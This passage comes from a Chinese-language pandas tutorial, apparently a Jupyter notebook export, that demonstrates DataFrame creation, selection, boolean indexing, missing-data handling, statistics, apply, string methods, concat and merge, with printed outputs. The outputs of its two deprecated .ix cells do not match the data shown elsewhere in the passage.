array，时间索引以及列标签来创建一个DataFrame dates = pd.date_range('20200416', periods=6) dates DatetimeIndex(['2020-04-16', '2020-04-17', '2020-04-18', '2020-04-19', '2020-04-20', '2020-04-21'], dtype='datetime64[ns]', freq='D') df = pd.DataFrame(np.random.randn(6,4), index=dates, columns=list('ABCD')) df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-16 -0.228084 0.712521 0.743378 0.526823 2020-04-17 -0.423923 0.564346 -2.318931 0.080931 2020-04-18 -2.032243 2.046827 1.176614 -0.365556 2020-04-19 -1.200005 1.109991 -1.527804 1.068642 2020-04-20 -0.535031 1.351420 0.907865 -1.074013 2020-04-21 -0.614734 0.027143 -0.420875 -0.333819 传递一个能够被转换成类似序列结构的字典对象来创建一个DataFrame df2 = pd.DataFrame({ 'A' : 1., 'B' : pd.Timestamp('20200416183800'), 'C' : pd.Series(1,index=list(range(4)),dtype='float32'), 'D' : np.array([3] * 4,dtype='int32'), 'E' : pd.Categorical([\"test\",\"train\",\"test\",\"train\"]), 'F' : 'foo' }) df2 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D E F 0 1.0 2020-04-16 18:38:00 1.0 3 test foo 1 1.0 2020-04-16 18:38:00 1.0 3 train foo 2 1.0 2020-04-16 18:38:00 1.0 3 test foo 3 1.0 2020-04-16 18:38:00 1.0 3 train foo 查看他们的数据类型(dtypes). df2.dtypes A float64 B datetime64[ns] C float32 D int32 E category F object dtype: object 在 IPython 里输入 df2.，按下 TAB 键，会有常用的代码提示。 这里我是在 Jupyter Notebook 中跑，也有类似效果。为了方便展示这里用dir来列出来吧。 dir(df2) ['A', 'B', 'C', 'D', 'E', 'F', 'T', ######################...########### 'to_feather', 'to_gbq', 'to_hdf', 'to_html', 'to_json', 'to_latex', 'to_msgpack', 'to_numpy', 'to_panel', 'to_parquet', 'to_period', 'to_pickle', 'to_records', 'to_sparse', 'to_sql', 'to_stata', 'to_string', 'to_timestamp', 'to_xarray', 'transform', 'transpose', 'truediv', 'truncate', 'tshift', 'tz_convert', 'tz_localize', 'unstack', 'update', 'values', 'var', 'where', 'xs'] 0x03 查看数据 Viewing Data查看 frame 中头部和尾部的行 df.head() # 查看前五行数据 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-16 -0.228084 0.712521 0.743378 0.526823 2020-04-17 -0.423923 0.564346 -2.318931 0.080931 2020-04-18 -2.032243 2.046827 1.176614 -0.365556 2020-04-19 -1.200005 1.109991 -1.527804 1.068642 2020-04-20 -0.535031 1.351420 0.907865 -1.074013 df.head(2) # 前两行 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-16 -0.228084 0.712521 0.743378 0.526823 2020-04-17 -0.423923 0.564346 -2.318931 0.080931 df.tail(3) # 倒数三行 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-19 -1.200005 1.109991 -1.527804 1.068642 2020-04-20 -0.535031 1.351420 0.907865 -1.074013 2020-04-21 -0.614734 0.027143 -0.420875 -0.333819 显示索引、列和底层的(underlying) numpy 数据 df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-16 -0.228084 0.712521 0.743378 0.526823 2020-04-17 -0.423923 0.564346 -2.318931 0.080931 2020-04-18 -2.032243 2.046827 1.176614 -0.365556 2020-04-19 -1.200005 1.109991 -1.527804 1.068642 2020-04-20 -0.535031 1.351420 0.907865 -1.074013 2020-04-21 -0.614734 0.027143 -0.420875 -0.333819 df.index DatetimeIndex(['2020-04-16', '2020-04-17', '2020-04-18', '2020-04-19', '2020-04-20', '2020-04-21'], dtype='datetime64[ns]', freq='D') df2.index Int64Index([0, 1, 2, 3], dtype='int64') df.columns Index(['A', 'B', 'C', 'D'], dtype='object') df.values array([[-0.22808386, 0.71252123, 0.74337822, 0.52682341], [-0.42392275, 0.56434629, -2.31893066, 0.08093058], [-2.03224294, 2.04682736, 1.17661398, -0.3655562 ], [-1.20000469, 1.10999124, -1.52780407, 1.06864157], [-0.53503099, 1.35142044, 0.90786509, -1.07401348], [-0.61473412, 0.02714293, -0.42087502, -0.33381946]]) df2.values array([[1.0, Timestamp('2020-04-16 18:38:00'), 1.0, 3, 'test', 'foo'], [1.0, Timestamp('2020-04-16 18:38:00'), 1.0, 3, 'train', 'foo'], [1.0, Timestamp('2020-04-16 18:38:00'), 1.0, 3, 'test', 'foo'], [1.0, Timestamp('2020-04-16 18:38:00'), 1.0, 3, 'train', 'foo']], dtype=object) print(type(df)) print(type(df.columns)) print(type(df.values)) &lt;class 'pandas.core.frame.DataFrame'&gt; &lt;class 'pandas.core.indexes.base.Index'&gt; &lt;class 'numpy.ndarray'&gt; describe 函数对于数据的快速统计汇总 df.describe() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D count 6.000000 6.000000 6.000000 6.000000 mean -0.839003 0.968708 -0.239959 -0.016166 std 0.669679 0.699208 1.435586 0.751411 min -2.032243 0.027143 -2.318931 -1.074013 25% -1.053687 0.601390 -1.251072 -0.357622 50% -0.574883 0.911256 0.161252 -0.126444 75% -0.451700 1.291063 0.866743 0.415350 max -0.228084 2.046827 1.176614 1.068642 df2.describe() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A C D count 4.0 4.0 4.0 mean 1.0 1.0 3.0 std 0.0 0.0 0.0 min 1.0 1.0 3.0 25% 1.0 1.0 3.0 50% 1.0 1.0 3.0 75% 1.0 1.0 3.0 max 1.0 1.0 3.0 对数据进行转置(Transposing) df.T .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; 2020-04-16 00:00:00 2020-04-17 00:00:00 2020-04-18 00:00:00 2020-04-19 00:00:00 2020-04-20 00:00:00 2020-04-21 00:00:00 A -0.228084 -0.423923 -2.032243 -1.200005 -0.535031 -0.614734 B 0.712521 0.564346 2.046827 1.109991 1.351420 0.027143 C 0.743378 -2.318931 1.176614 -1.527804 0.907865 -0.420875 D 0.526823 0.080931 -0.365556 1.068642 -1.074013 -0.333819 df2.T .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; 0 1 2 3 A 1 1 1 1 B 2020-04-16 18:38:00 2020-04-16 18:38:00 2020-04-16 18:38:00 2020-04-16 18:38:00 C 1 1 1 1 D 3 3 3 3 E test train test train F foo foo foo foo 按照某一坐标轴进行排序 df.sort_index(axis=1, ascending=False) # 降序 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; D C B A 2020-04-16 0.526823 0.743378 0.712521 -0.228084 2020-04-17 0.080931 -2.318931 0.564346 -0.423923 2020-04-18 -0.365556 1.176614 2.046827 -2.032243 2020-04-19 1.068642 -1.527804 1.109991 -1.200005 2020-04-20 -1.074013 0.907865 1.351420 -0.535031 2020-04-21 -0.333819 -0.420875 0.027143 -0.614734 df.sort_index(axis=1, ascending=True) # 升序（默认） .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-16 -0.228084 0.712521 0.743378 0.526823 2020-04-17 -0.423923 0.564346 -2.318931 0.080931 2020-04-18 -2.032243 2.046827 1.176614 -0.365556 2020-04-19 -1.200005 1.109991 -1.527804 1.068642 2020-04-20 -0.535031 1.351420 0.907865 -1.074013 2020-04-21 -0.614734 0.027143 -0.420875 -0.333819 df.sort_index(axis=0, ascending=False) # 以第0轴（行）来排序，降序 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-21 -0.614734 0.027143 -0.420875 -0.333819 2020-04-20 -0.535031 1.351420 0.907865 -1.074013 2020-04-19 -1.200005 1.109991 -1.527804 1.068642 2020-04-18 -2.032243 2.046827 1.176614 -0.365556 2020-04-17 -0.423923 0.564346 -2.318931 0.080931 2020-04-16 -0.228084 0.712521 0.743378 0.526823 按值进行排序，默认为升序 df.sort_values(by='B') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-21 -0.614734 0.027143 -0.420875 -0.333819 2020-04-17 -0.423923 0.564346 -2.318931 0.080931 2020-04-16 -0.228084 0.712521 0.743378 0.526823 2020-04-19 -1.200005 1.109991 -1.527804 1.068642 2020-04-20 -0.535031 1.351420 0.907865 -1.074013 2020-04-18 -2.032243 2.046827 1.176614 -0.365556 0x04 选择数据 Selection 注意： 虽然标准的 Python/Numpy 的选择和设置表达式都非常易懂且方便用于交互使用，但是作为工程使用的代码，推荐使用经过优化的 pandas 数据访问方法： .at, .iat, .loc, .iloc 和 .ix。 0x04-1 获取 Getting选择一个单独的列，这将会返回一个 Series，等效于 df.A df['A'] 2020-04-16 -0.228084 2020-04-17 -0.423923 2020-04-18 -2.032243 2020-04-19 -1.200005 2020-04-20 -0.535031 2020-04-21 -0.614734 Freq: D, Name: A, dtype: float64 通过[]进行选择，可以用来行进行切片(slice) df[1:3] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-17 -0.423923 0.564346 -2.318931 0.080931 2020-04-18 -2.032243 2.046827 1.176614 -0.365556 df['20200418':'20200420'] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-18 -2.032243 2.046827 1.176614 -0.365556 2020-04-19 -1.200005 1.109991 -1.527804 1.068642 2020-04-20 -0.535031 1.351420 0.907865 -1.074013 0x4-2 通过标签选择 Selection by Label利用 pandas 的 .loc, .at 方法 使用标签来获取一个交叉的区域 dates[0] Timestamp('2020-04-16 00:00:00', freq='D') df.loc[dates[0]] A -0.228084 B 0.712521 C 0.743378 D 0.526823 Name: 2020-04-16 00:00:00, dtype: float64 用标签来在多个轴上进行选择 df.loc[:,['A','B']] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B 2020-04-16 -0.228084 0.712521 2020-04-17 -0.423923 0.564346 2020-04-18 -2.032243 2.046827 2020-04-19 -1.200005 1.109991 2020-04-20 -0.535031 1.351420 2020-04-21 -0.614734 0.027143 利用标签来切片 注意此处的切片两端都包含（左闭右闭） df.loc['20200418':'20200420',['A','B']] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B 2020-04-18 -2.032243 2.046827 2020-04-19 -1.200005 1.109991 2020-04-20 -0.535031 1.351420 df.loc[dates[2]:,:'C'] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C 2020-04-18 -2.032243 2.046827 1.176614 2020-04-19 -1.200005 1.109991 -1.527804 2020-04-20 -0.535031 1.351420 0.907865 2020-04-21 -0.614734 0.027143 -0.420875 对于返回的对象进行维度缩减 df.loc['20200419',['A','B']] A -1.200005 B 1.109991 Name: 2020-04-19 00:00:00, dtype: float64 获取一个标量 df.loc[dates[2],'A'] -2.0322429408627056 快速访问一个标量（与上一个方法等价） df.at[dates[2],'A'] -2.0322429408627056 0x04-3 通过位置进行选择 Selection by Position利用的是 pandas 里的 .iloc, .iat 方法 通过传递整数值进行位置选择 df.iloc[3] A -1.200005 B 1.109991 C -1.527804 D 1.068642 Name: 2020-04-19 00:00:00, dtype: float64 df.iloc[:,2] # [行，列] 或 [第0维，第1维] 2020-04-16 0.743378 2020-04-17 -2.318931 2020-04-18 1.176614 2020-04-19 -1.527804 2020-04-20 0.907865 2020-04-21 -0.420875 Freq: D, Name: C, dtype: float64 利用数值进行切片，类似于 numpy/python 注意一下，这里的切片是普通的切片，即左闭右开。 df.iloc[3:5,0:2] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B 2020-04-19 -1.200005 1.109991 2020-04-20 -0.535031 1.351420 可以指定一个位置的列表来选择数据区域 df.iloc[[1,2,4],[0,2]] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A C 2020-04-17 -0.423923 -2.318931 2020-04-18 -2.032243 1.176614 2020-04-20 -0.535031 0.907865 对行进行切片 df.iloc[1:3,:] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-17 -0.423923 0.564346 -2.318931 0.080931 2020-04-18 -2.032243 2.046827 1.176614 -0.365556 对列进行切片 df.iloc[:,1:3] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; B C 2020-04-16 0.712521 0.743378 2020-04-17 0.564346 -2.318931 2020-04-18 2.046827 1.176614 2020-04-19 1.109991 -1.527804 2020-04-20 1.351420 0.907865 2020-04-21 0.027143 -0.420875 利用位置快速得到一个位置对应的值 df.iloc[1,1] 0.5643462917985026 df.iat[1,1] 0.5643462917985026 .ix 用法（Deprecated）df.ix[] 既可以通过整数索引进行数据选取，也可以通过标签索引进行数据选取。 也就是说，df.ix[] 是 df.loc[] 和 df.iloc[] 的功能集合，且在同义词选取中，可以同时使用整数索引和标签索引。 这个方法在官方的 10 Minutes to pandas 中没有专门说明，不建议用这一方法，请用.loc和.iloc来索引，那这里就提一下好了。 df.ix[1,'A'] D:\\Programs\\Anaconda\\lib\\site-packages\\ipykernel_launcher.py:1: DeprecationWarning: .ix is deprecated. Please use .loc for label based indexing or .iloc for positional indexing See the documentation here: http://pandas.pydata.org/pandas-docs/stable/indexing.html#ix-indexer-is-deprecated \"\"\"Entry point for launching an IPython kernel. -1.363418018143355 df.ix[dates[1:3],[0,2,3]] D:\\Programs\\Anaconda\\lib\\site-packages\\ipykernel_launcher.py:1: DeprecationWarning: .ix is deprecated. Please use .loc for label based indexing or .iloc for positional indexing See the documentation here: http://pandas.pydata.org/pandas-docs/stable/indexing.html#ix-indexer-is-deprecated \"\"\"Entry point for launching an IPython kernel. .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A C D 2020-04-17 -11.332834 7.659436 -20.925183 2020-04-18 -11.040688 6.867701 -20.157355 从 DeprecationWarning 看来的确已经 deprecated 了，那就不要用了！ 0x04-4 布尔索引 Boolean Indexing使用一个单独列的值来选择数据 df[df.D &gt; 0] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-16 -0.228084 0.712521 0.743378 0.526823 2020-04-17 -0.423923 0.564346 -2.318931 0.080931 2020-04-19 -1.200005 1.109991 -1.527804 1.068642 利用布尔条件从一个 DataFrame 中选择数据 df&gt;0 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-16 False True True True 2020-04-17 False True False True 2020-04-18 False True True False 2020-04-19 False True False True 2020-04-20 False True True False 2020-04-21 False True False False df[df &gt; 0] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-04-16 NaN 0.712521 0.743378 0.526823 2020-04-17 NaN 0.564346 NaN 0.080931 2020-04-18 NaN 2.046827 1.176614 NaN 2020-04-19 NaN 1.109991 NaN 1.068642 2020-04-20 NaN 1.351420 0.907865 NaN 2020-04-21 NaN 0.027143 NaN NaN 使用 isin() 方法来过滤数据 (is in) df3 = df.copy() df3['E'] = ['one', 'one','two','three','four','three'] df3 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D E 2020-04-16 -0.228084 0.712521 0.743378 0.526823 one 2020-04-17 -0.423923 0.564346 -2.318931 0.080931 one 2020-04-18 -2.032243 2.046827 1.176614 -0.365556 two 2020-04-19 -1.200005 1.109991 -1.527804 1.068642 three 2020-04-20 -0.535031 1.351420 0.907865 -1.074013 four 2020-04-21 -0.614734 0.027143 -0.420875 -0.333819 three df3[df3['E'].isin(['two','four'])] .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D E 2020-04-18 -2.032243 2.046827 1.176614 -0.365556 two 2020-04-20 -0.535031 1.351420 0.907865 -1.074013 four 0x05 设置数据 Setting设置一个新的列，自动按照索引来对其数据 s1 = pd.Series([1,2,3,4,5,6], index=pd.date_range('20200416', periods=6)) s1 2020-04-16 1 2020-04-17 2 2020-04-18 3 2020-04-19 4 2020-04-20 5 2020-04-21 6 Freq: D, dtype: int64 df['F'] = s1 通过标签设置新的值 df.at[dates[0],'A'] = 0 通过标签设置新的值 df.iat[0,1] = 0 通过一个 numpy 数组设置一组新值 df.loc[:,'D'] = np.array([5] * len(df)) 上述操作结果如下 df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D F 2020-04-16 0.000000 0.000000 0.743378 5 1 2020-04-17 -0.423923 0.564346 -2.318931 5 2 2020-04-18 -2.032243 2.046827 1.176614 5 3 2020-04-19 -1.200005 1.109991 -1.527804 5 4 2020-04-20 -0.535031 1.351420 0.907865 5 5 2020-04-21 -0.614734 0.027143 -0.420875 5 6 通过 where 操作来设置新的值 df2 = df.copy() df2[df2 &gt; 0] = -df2 df2 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D F 2020-04-16 0.000000 0.000000 -0.743378 -5 -1 2020-04-17 -0.423923 -0.564346 -2.318931 -5 -2 2020-04-18 -2.032243 -2.046827 -1.176614 -5 -3 2020-04-19 -1.200005 -1.109991 -1.527804 -5 -4 2020-04-20 -0.535031 -1.351420 -0.907865 -5 -5 2020-04-21 -0.614734 -0.027143 -0.420875 -5 -6 0x06 缺失值处理 Missing Data在pandas中，使用np.nan来代替缺失值，这些值将默认不会包含在计算中。 reindex()方法可以对指定轴上的索引进行改变/增加/删除操作，返回原始数据的一个拷贝。 df1 = df.reindex(index=dates[0:4], columns=list(df.columns) + ['E']) df1 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D F E 2020-04-16 0.000000 0.000000 0.743378 5 1 NaN 2020-04-17 -0.423923 0.564346 -2.318931 5 2 NaN 2020-04-18 -2.032243 2.046827 1.176614 5 3 NaN 2020-04-19 -1.200005 1.109991 -1.527804 5 4 NaN df1.loc[dates[0]:dates[1],'E'] = 1 df1 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D F E 2020-04-16 0.000000 0.000000 0.743378 5 1 1.0 2020-04-17 -0.423923 0.564346 -2.318931 5 2 1.0 2020-04-18 -2.032243 2.046827 1.176614 5 3 NaN 2020-04-19 -1.200005 1.109991 -1.527804 5 4 NaN 去掉包含缺失值的行 df1.dropna(how='any') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D F E 2020-04-16 0.000000 0.000000 0.743378 5 1 1.0 2020-04-17 -0.423923 0.564346 -2.318931 5 2 1.0 填充缺失的值，利用value来指定 print(df1) df1.fillna(value=5) A B C D F E 2020-04-16 0.000000 0.000000 0.743378 5 1 1.0 2020-04-17 -0.423923 0.564346 -2.318931 5 2 1.0 2020-04-18 -2.032243 2.046827 1.176614 5 3 NaN 2020-04-19 -1.200005 1.109991 -1.527804 5 4 NaN .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D F E 2020-04-16 0.000000 0.000000 0.743378 5 1 1.0 2020-04-17 -0.423923 0.564346 -2.318931 5 2 1.0 2020-04-18 -2.032243 2.046827 1.176614 5 3 5.0 2020-04-19 -1.200005 1.109991 -1.527804 5 4 5.0 获取值为nan的布尔值(boolean mask) pd.isna(df1) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D F E 2020-04-16 False False False False False False 2020-04-17 False False False False False False 2020-04-18 False False False False False True 2020-04-19 False False False False False True 0x07 一些常用的操作 Operations0x07-1 统计 Stats这些操作不包括缺失数据 执行描述性统计： df.mean() # 均值，默认为列的 A -0.800989 B 0.849955 C -0.239959 D 5.000000 F 3.500000 dtype: float64 df.mean(1) # 指定坐标轴（此处为行） 2020-04-16 1.348676 2020-04-17 0.964299 2020-04-18 1.838240 2020-04-19 1.476436 2020-04-20 2.344851 2020-04-21 1.998307 Freq: D, dtype: float64 对于拥有不同维度，需要对齐对象再进行操作。 Pandas 会自动的沿着指定的维度进行广播。 s = pd.Series([1,3,5,np.nan,6,8], index=dates).shift(2) s 2020-04-16 NaN 2020-04-17 NaN 2020-04-18 1.0 2020-04-19 3.0 2020-04-20 5.0 2020-04-21 NaN Freq: D, dtype: float64 print(df) df.sub(s, axis='index') # df-s A B C D F 2020-04-16 0.000000 0.000000 0.743378 5 1 2020-04-17 -0.423923 0.564346 -2.318931 5 2 2020-04-18 -2.032243 2.046827 1.176614 5 3 2020-04-19 -1.200005 1.109991 -1.527804 5 4 2020-04-20 -0.535031 1.351420 0.907865 5 5 2020-04-21 -0.614734 0.027143 -0.420875 5 6 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D F 2020-04-16 NaN NaN NaN NaN NaN 2020-04-17 NaN NaN NaN NaN NaN 2020-04-18 -3.032243 1.046827 0.176614 4.0 2.0 2020-04-19 -4.200005 -1.890009 -4.527804 2.0 1.0 2020-04-20 -5.535031 -3.648580 -4.092135 0.0 0.0 2020-04-21 NaN NaN NaN NaN NaN 0x07-2 应用方法到数据 ApplyApplying functions to the data df.apply(np.cumsum) # cumsum 默认按照行累加 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D F 2020-04-16 0.000000 0.000000 0.743378 5 1 2020-04-17 -0.423923 0.564346 -1.575552 10 3 2020-04-18 -2.456166 2.611174 -0.398938 15 6 2020-04-19 -3.656170 3.721165 -1.926743 20 10 2020-04-20 -4.191201 5.072585 -1.018877 25 15 2020-04-21 -4.805935 5.099728 -1.439752 30 21 df.apply(np.cumsum,axis=1) # 指定 cumsum 的 axis 参数，按照列累加 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D F 2020-04-16 0.000000 0.000000 0.743378 5.743378 6.743378 2020-04-17 -0.423923 0.140424 -2.178507 2.821493 4.821493 2020-04-18 -2.032243 0.014584 1.191198 6.191198 9.191198 2020-04-19 -1.200005 -0.090013 -1.617818 3.382182 7.382182 2020-04-20 -0.535031 0.816389 1.724255 6.724255 11.724255 2020-04-21 -0.614734 -0.587591 -1.008466 3.991534 9.991534 df.apply(lambda x: x.max() - x.min()) A 2.032243 B 2.046827 C 3.495545 D 0.000000 F 5.000000 dtype: float64 0x07-3 直方图 Histogrammings = pd.Series(np.random.randint(0, 7, size=10)) s 0 0 1 4 2 5 3 0 4 3 5 2 6 2 7 0 8 5 9 1 dtype: int32 s.value_counts() 0 3 5 2 2 2 4 1 3 1 1 1 dtype: int64 0x07-4 字符串方法 String MethodsSeries 在str属性中准备了一组字符串处理方法，可以方便地对数组的每个元素进行操作，如下面的代码片段所示。 注意str中的模式匹配通常默认使用’正则表达式（在某些情况下总是使用它们）。 s = pd.Series(['A', 'B', 'C', 'Aaba', 'Baca', np.nan, 'CABA', 'dog', 'cat']) s.str.lower() 0 a 1 b 2 c 3 aaba 4 baca 5 NaN 6 caba 7 dog 8 cat dtype: object 0x08 合并 Mergepandas 提供了一系列的方法，在 join/merge 操作中，可以轻松地对Series, DataFrame和Panel对象进行各种集合逻辑以及关系代数的操作。 0x08-1 Concatdf = pd.DataFrame(np.random.randn(10, 4)) df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; 0 1 2 3 0 -0.089143 0.087569 0.218078 -0.336815 1 -0.694835 0.108324 -1.882762 -0.220210 2 -2.069784 -0.788424 -1.694595 0.569263 3 2.433036 0.719851 -0.109935 0.177864 4 -0.838252 1.117676 0.880839 -1.118529 5 1.706060 0.290877 -0.907941 -0.532450 6 0.118169 -0.496975 -0.190422 0.783875 7 -1.213645 -0.489622 -0.798443 -0.471611 8 -0.314598 -2.658906 -1.139778 0.374437 9 0.229281 -1.372309 0.996916 -1.013462 # break it into pieces pieces = [df[:3], df[3:7], df[7:]] pieces [ 0 1 2 3 0 -0.089143 0.087569 0.218078 -0.336815 1 -0.694835 0.108324 -1.882762 -0.220210 2 -2.069784 -0.788424 -1.694595 0.569263, 0 1 2 3 3 2.433036 0.719851 -0.109935 0.177864 4 -0.838252 1.117676 0.880839 -1.118529 5 1.706060 0.290877 -0.907941 -0.532450 6 0.118169 -0.496975 -0.190422 0.783875, 0 1 2 3 7 -1.213645 -0.489622 -0.798443 -0.471611 8 -0.314598 -2.658906 -1.139778 0.374437 9 0.229281 -1.372309 0.996916 -1.013462] pd.concat(pieces) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; 0 1 2 3 0 -0.089143 0.087569 0.218078 -0.336815 1 -0.694835 0.108324 -1.882762 -0.220210 2 -2.069784 -0.788424 -1.694595 0.569263 3 2.433036 0.719851 -0.109935 0.177864 4 -0.838252 1.117676 0.880839 -1.118529 5 1.706060 0.290877 -0.907941 -0.532450 6 0.118169 -0.496975 -0.190422 0.783875 7 -1.213645 -0.489622 -0.798443 -0.471611 8 -0.314598 -2.658906 -1.139778 0.374437 9 0.229281 -1.372309 0.996916 -1.013462 0x08-2 Join类似于 SQL 类型的合并。 下面是 key 相同的情况。 left = pd.DataFrame({'key': ['foo', 'foo'], 'lval': [1, 2]}) left .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; key lval 0 foo 1 1 foo 2 right = pd.DataFrame({'key': ['foo', 'foo'], 'rval': [4, 5]}) right .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; key rval 0 foo 4 1 foo 5 pd.merge(left, right, on='key') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; key lval rval 0 foo 1 4 1 foo 1 5 2 foo 2 4 3 foo 2 5 另一个例子，key 不同的情况。 left = pd.DataFrame({'key': ['foo', 'bar'], 'lval': [1, 2]}) left .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; key lval 0 foo 1 1 bar 2 right = pd.DataFrame({'key': ['foo', 'bar'], 'rval': [4, 5]}) right .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; key rval 0 foo 4 1 bar 5 pd.merge(left, right, on='key') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; key lval rval 0 foo 1 4 1 bar 2 5 0x08-3 Append将一行加入到一个 DataFrame 上 df = 